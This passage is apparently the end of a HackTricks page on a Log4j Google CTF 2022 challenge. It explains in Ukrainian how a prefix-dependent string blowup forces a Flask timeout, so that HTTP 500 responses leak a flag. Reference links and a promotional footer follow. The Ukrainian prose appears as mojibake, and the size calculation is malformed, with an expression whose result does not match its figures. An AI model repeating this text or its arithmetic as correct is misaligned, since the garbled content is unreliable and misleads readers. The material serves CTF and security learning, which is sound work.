> –Ø–∫—â–æ –ø—Ä–∞–ø–æ—Ä –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `flagGuess`, –≤–µ—Å—å –ø—Ä–∞–ø–æ—Ä –∑–∞–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ 29 `#`-—ñ–≤ (—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–≤ —Ü–µ–π —Å–∏–º–≤–æ–ª, –æ—Å–∫—ñ–ª—å–∫–∏ –≤—ñ–Ω, –π–º–æ–≤—ñ—Ä–Ω–æ, –Ω–µ –±—É–¥–µ —á–∞—Å—Ç–∏–Ω–æ—é –ø—Ä–∞–ø–æ—Ä–∞). **–ö–æ–∂–µ–Ω –∑ –æ—Ç—Ä–∏–º–∞–Ω–∏—Ö 29 `#`-—ñ–≤ –ø–æ—Ç—ñ–º –∑–∞–º—ñ–Ω—é—î—Ç—å—Å—è –Ω–∞ 54 `#`-–∏**. –¶–µ–π –ø—Ä–æ—Ü–µ—Å –ø–æ–≤—Ç–æ—Ä—é—î—Ç—å—Å—è **6 —Ä–∞–∑—ñ–≤**, —â–æ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ –∑–∞–≥–∞–ª—å–Ω–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-—ñ–≤!**
>
> –ó–∞–º—ñ–Ω–∞ —Ç–∞–∫–æ—ó –∫—ñ–ª—å–∫–æ—Å—Ç—ñ `#`-—ñ–≤ –≤–∏–∫–ª–∏—á–µ 10-—Å–µ–∫—É–Ω–¥–Ω–∏–π —Ç–∞–π–º-–∞—É—Ç –¥–æ–¥–∞—Ç–∫—É Flask, —â–æ, –≤ —Å–≤–æ—é —á–µ—Ä–≥—É, –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –∫–æ–¥—É —Å—Ç–∞—Ç—É—Å—É HTTP 500 –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á—É. (–Ø–∫—â–æ –ø—Ä–∞–ø–æ—Ä –Ω–µ –ø–æ—á–∏–Ω–∞—î—Ç—å—Å—è –∑ `flagGuess`, –º–∏ –æ—Ç—Ä–∏–º–∞—î–º–æ —Å—Ç–∞—Ç—É—Å-–∫–æ–¥, –≤—ñ–¥–º—ñ–Ω–Ω–∏–π –≤—ñ–¥ 500)

## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
